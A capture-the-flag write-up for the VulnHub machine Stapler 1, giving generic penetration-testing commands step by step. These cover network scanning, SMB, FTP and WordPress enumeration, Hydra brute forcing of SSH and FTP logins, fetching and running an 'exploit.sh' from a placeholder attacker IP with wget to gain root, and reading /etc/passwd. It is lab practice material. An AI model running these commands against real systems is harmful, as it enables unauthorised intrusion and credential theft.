# Stapler 1 Writeup

## Machine Information

| Machine | Stapler 1 |
|---|---|
| Platform | VulnHub |
| Difficulty | intermediate |
| OS | Linux |

---

# Objective

- Gain initial foothold
- Escalate privileges
- Capture root access

---

# Step 1 — Identify Target IP

```bash
netdiscover -r YOUR_KALI_IP_ADDRESS
```

OR

```bash
arp-scan -l
```

---

# Step 2 — Nmap Enumeration

```bash
nmap -sC -sV -A -Pn TARGET_IP
```

Full Port Scan:

```bash
nmap -p- -T4 TARGET_IP
```

Save Scan:

```bash
nmap -sC -sV -oN nmap.txt TARGET_IP
```

---

# Step 3 — SMB Enumeration

Check SMB shares:

```bash
smbclient -L //TARGET_IP
```

Anonymous login:

```bash
smbclient //TARGET_IP/share
```

Enumerate users:

```bash
enum4linux TARGET_IP
```

---

# Step 4 — FTP Enumeration

Check FTP:

```bash
ftp TARGET_IP
```

Try anonymous login:

```bash
anonymous
```

Password:

```bash
anonymous
```

Download files:

```bash
get filename
```

---

# Step 5 — Web Enumeration

Open browser:

```bash
http://TARGET_IP
```

Directory Bruteforce:

```bash
gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirb/common.txt
```

Alternative:

```bash
dirb http://TARGET_IP
```

---

# Step 6 — CMS Detection

Check technologies:

```bash
whatweb http://TARGET_IP
```

WordPress scan:

```bash
wpscan --url http://TARGET_IP --enumerate u
```

Plugin scan:

```bash
wpscan --url http://TARGET_IP --enumerate p
```

---

# Step 7 — User Enumeration

Possible usernames:

```text
harry
barry
martin
elly
john
```

Bruteforce login:

```bash
hydra -L users.txt -P rockyou.txt ssh://TARGET_IP
```

FTP Bruteforce:

```bash
hydra -L users.txt -P rockyou.txt ftp://TARGET_IP
```

---

# Step 8 — Gain Initial Shell

SSH login:

```bash
ssh username@TARGET_IP
```

Stabilize shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

OR

```bash
/bin/bash -i
```

---

# Step 9 — Local Enumeration

Kernel info:

```bash
uname -a
```

Check sudo:

```bash
sudo -l
```

Find SUID binaries:

```bash
find / -perm -4000 2>/dev/null
```

Check cron jobs:

```bash
crontab -l
```

---

# Step 10 — Privilege Escalation

Search exploits:

```bash
searchsploit linux kernel
```

Transfer exploit:

```bash
wget http://YOUR_IP/exploit.sh
```

Make executable:

```bash
chmod +x exploit.sh
```

Run exploit:

```bash
./exploit.sh
```

---

# Step 11 — Root Access

Verify root:

```bash
id
```

Expected:

```text
uid=0(root) gid=0(root)
```

Capture flag:

```bash
cat /root/flag.txt
```

---

# Step 12 — Post Exploitation

Check users:

```bash
cat /etc/passwd
```

Network information:

```bash
ip a
```

Processes:

```bash
ps aux
```

---

# Tools Used

- Nmap
- Gobuster
- Enum4Linux
- Hydra
- WPScan
- Searchsploit

---

# Key Learning Points

- SMB Enumeration
- FTP Enumeration
- WordPress Enumeration
- Credential Discovery
- Privilege Escalation
- Linux Post Exploitation

---

# Conclusion

Stapler 1 is an excellent VulnHub machine for practicing:

- Enumeration
- Service exploitation
- WordPress attacks
- Linux privilege escalation
- Multi-service analysis

It teaches realistic penetration testing workflow and methodology.

And this machine is solved by Sabareesh C V
